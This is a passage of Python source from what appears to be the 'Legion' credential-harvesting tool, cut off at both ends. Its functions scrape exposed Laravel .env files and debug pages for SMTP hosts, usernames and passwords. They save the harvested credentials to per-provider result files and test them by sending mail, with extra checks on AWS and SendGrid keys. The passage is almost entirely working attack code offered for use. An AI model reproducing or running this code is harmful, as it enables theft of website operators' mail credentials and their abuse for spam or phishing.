						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(COX).txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)

					elif 'earthlink' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(EARTH).txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)

					elif 'global-mail' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(GLOBAL).txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)

					elif 'gmx' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(GMX).txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)

					elif 'godaddy' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(GODADDY).txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)

					elif 'hinet' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(HINET).txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)

					elif 'hotmail' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(HOTMAIL).txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)

					elif 'mail.ru' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(MAILRU).txt', 'a')
						save.write(remover+'\n')
						save.close()
						mail(url, mailhost, mailport, mailuser, mailpass, mailfrom)

					elif 'mimecast' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(RANDOM).txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)

					elif 'mweb' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(MWEB).txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)

					elif 'netease' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(NETEASE).txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)

					elif 'NetworkSolutions' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(NETWORK).txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)

					elif 'outlook' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(HOTMAIL).txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)

					elif 'qq' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(QQ).txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)

					elif 'sina-email' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(SINA).txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)

					elif 'strato' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(STRATO).txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)

					elif 'synaq' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(SYNAQ).txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)

					elif 'yihigher' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(YIGHER).txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)

					elif 'zmail' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(ZMAIL).txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)

					elif 'rise-tokyo' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(RISE-TOKIO).txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)
					elif 'tatsumi-b' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(TATSUMI).txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)
					elif 'sendinblue' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(SENDINBLUE).txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)
					else:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						build2 = str(mailhost)+'|'+str(mailuser)+'|'+str(mailpass)+'|0'
						remover = str(build).replace('\r', '')
						remover2 = str(build2).replace('\r', '')
						print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}SMTP {fc}[{yl}{mailhost}{res}{fc}]")
						save = open('Results/SMTP(RANDOM).txt', 'a')
						save.write(remover+'\n')
						save.close()
						save = open('Results/SMTP(Legion_sender).txt', 'a')
						save.write(remover2+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)

					return True
			else:
				return False
		except:
			return False
	def get_smtp2(self, text, url):
		try:
			if "#MAIL_HOST" in text:
				if "#MAIL_HOST=" in text:
					method = '/.env'
					mailhost = reg("\n#MAIL_HOST=(.*?)\n", text)[0]
					mailport = reg("\n#MAIL_PORT=(.*?)\n", text)[0]
					mailuser = reg("\n#MAIL_USERNAME=(.*?)\n", text)[0]
					mailpass = reg("\n#MAIL_PASSWORD=(.*?)\n", text)[0]
					try:
						mailfrom = reg("#MAIL_FROM_ADDRESS=(.*?)\n", text)[0]
					except:
						mailfrom = 'info@mylegion.in'
					try:
						fromname = reg("#MAIL_FROM_NAME=(.*?)\n", text)[0]
					except:
						fromname = 'Legion'
				elif "<td>#MAIL_HOST</td>" in text:
					method = 'debug'
					mailhost = reg('<td>#MAIL_HOST<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					mailport = reg('<td>#MAIL_PORT<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					mailuser = reg('<td>#MAIL_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					mailpass = reg('<td>#MAIL_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					try:
						mailfrom = reg("<td>#MAIL_FROM_ADDRESS<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						mailfrom = 'info@mylegion.in'
					try:
						fromname = reg("<td>#MAIL_FROM_NAME<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						fromname = 'Legion'
				if mailuser == "null" or mailpass == "null" or mailuser == "" or mailpass == "":
					return False
				else:
					satu = cleanit(mailhost + '|' + mailport + '|' + mailuser + '|' + mailpass)
					if '.amazonaws.com' in mailhost:
						getcountry = reg('email-smtp.(.*?).amazonaws.com', mailhost)[0]
						build = str(mailuser)+':'+str(mailpass)+':'+str(mailhost)
						remover = str(build).replace('\r', '')
						save = open('Results/'+getcountry[:-2]+'.txt', 'a')
						save.write(remover+'\n')
						save.close()
						remover = str(build).replace('\r', '')
						save2 = open('Results/SMTP(AWS)#Debug.txt', 'a')
						save2.write(remover+'\n')
						save2.close()
						ceker_aws(url,mailuser,mailpass,getcountry[:-2])
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)
					elif 'sendgrid' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)+':ssl::::0'
						remover = str(build).replace('\r', '')
						print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}SENDGRID {fc}[{yl}{mailpass}{res}{fc}]")
						save = open('Results/SMTP(SENDGRID)#Debug.txt', 'a')
						save.write(remover+'\n')
						save.close()
						ceker_sendgrid(url, mailpass)
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)
						build_forchecker = str(mailhost)+":"+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover2 = str(build_forchecker).replace('\r', '')
						save3 = open('Results/forchecker/sendgrid.txt','a')
						save3.write(remover2+'\n')
						save3.close()
						ceker_sendgrid(url, mailpass)
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)
					elif 'office365' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(OFFICE365)#Debug.txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)



					elif '1and1' in mailhost or '1und1' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(1AND1)#Debug.txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)



					elif 'zoho' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(ZOHO)#Debug.txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)



					elif 'mandrillapp' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)+':ssl::::0'
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(MANDRILL)#Debug.txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)



					elif 'mailgun' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)+':ssl::::0'
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(MAILGUN)#Debug.txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)



					elif '.it' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(ITALY)#Debug.txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)



					elif 'emailsrvr' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(RACKSPACE)#Debug.txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)



					elif 'hostinger' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(HOSTINGER)#Debug.txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)



					elif '.yandex' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(YANDEX)#Debug.txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)


					elif '.OVH' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(OVH)#Debug.txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)



					elif '.ionos' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(IONOS)#Debug.txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)



					elif 'zimbra' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(ZIMBRA)#Debug.txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)



					elif 'kasserver.com' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(KASSASERVER)#Debug.txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)



					elif 'smtp-relay.gmail' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(RANDOM)#Debug.txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)



					elif 'sparkpostmail.com' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(SPARKPOST)#Debug.txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)



					elif '.jp' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(JAPAN)#Debug.txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)



					elif 'gmoserver' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(GMO)#Debug.txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)




					elif 'mailjet' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(MAILJET)#Debug.txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)



					elif 'gmail.com' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(GMAIL)#Debug.txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)



					elif 'googlemail' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(GOOGLEMAIL)#Debug.txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)



					elif 'aruba.it' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(ARUBA)#Debug.txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)



					elif 'hetzner' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(HETZNER)#Debug.txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)



					elif '163' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(163)#Debug.txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)



					elif '263' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(263)#Debug.txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)



					elif 'Aliyun' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(ALIYUN)#Debug.txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)



					elif 'att.net' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(ATTNET)#Debug.txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)



					elif 'chinaemail' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(CHINAEMAIL)#Debug.txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)



					elif 'comcast' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(COMCAST)#Debug.txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)



					elif 'cox.net' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(COX)#Debug.txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)



					elif 'earthlink' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(EARTH)#Debug.txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)



					elif 'global-mail' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(GLOBAL)#Debug.txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)



					elif 'gmx' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(GMX)#Debug.txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)



					elif 'godaddy' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(GODADDY)#Debug.txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)



					elif 'hinet' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(HINET)#Debug.txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)



					elif 'hotmail' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(HOTMAIL)#Debug.txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)



					elif 'mail.ru' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(MAILRU)#Debug.txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)



					elif 'mimecast' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(RANDOM)#Debug.txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)



					elif 'mweb' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(MWEB)#Debug.txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)



					elif 'netease' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(NETEASE)#Debug.txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)



					elif 'NetworkSolutions' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(NETWORK)#Debug.txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)



					elif 'outlook' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(HOTMAIL)#Debug.txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)



					elif 'qq' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(QQ)#Debug.txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)



					elif 'sina-email' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(SINA)#Debug.txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)



					elif 'strato' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(STRATO)#Debug.txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)



					elif 'synaq' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(SYNAQ)#Debug.txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)



					elif 'yihigher' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(YIGHER)#Debug.txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)



					elif 'zmail' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(ZMAIL)#Debug.txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)



					elif 'rise-tokyo' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(RISE-TOKIO)#Debug.txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)



					elif 'tatsumi-b' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(TATSUMI)#Debug.txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)




					elif 'sendinblue' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(SENDINBLUE)#Debug.txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)



					else:
